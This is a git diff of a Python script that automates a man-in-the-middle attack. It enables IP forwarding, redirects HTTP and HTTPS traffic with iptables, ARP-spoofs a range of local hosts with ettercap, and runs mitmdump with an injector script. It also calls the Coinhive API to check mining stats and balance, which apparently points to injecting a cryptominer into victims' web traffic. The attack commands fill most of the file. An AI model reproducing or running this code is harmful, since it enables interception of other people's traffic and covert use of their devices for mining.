@@ -5,22 +5,32 @@ import requests
 import os
 import sys
 
+
 def ip_forward():
     os.system("sysctl -w net.ipv4.ip_forward=1")
-    return True
-
-def config_ettercap():
-    os.system("ettercap -TqP autoadd -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150//")
     return True
 
 def config_iptables():
     os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
     os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
     return True
-    
+
+def config_ettercap():
+    os.system("ettercap -TqP autoadd -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150//")
+    return True
+
 def injector():
     os.system("mitmdump --mode transparent -s injector2.py")
     return True
+
+
+#def configure_iptables():
+#    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+#    return True
+
+#def get_cert(path, basename):
+#    os.system("~/.local/bin/mitmproxy -p 8080 -s 'cert *=cert.pem' 'controllers/injector2.py controllers/script.js' -T")
+#    return True
 
 def get_stats(secret_key, params={}):
     headers = {
@@ -38,3 +48,10 @@ def get_balance(secret_key, params={}):
     params.update(secret=secret_key)
     params.update(name="bytexmen@mail.com")
     return requests.get("https://api.coinhive.com/user/balance", params=params, headers=headers).json()
+
+
+if __name__ == "__main__":
+#    ip_forward()
+    config_iptables()
+#    config_ettercap()
+#    injector()
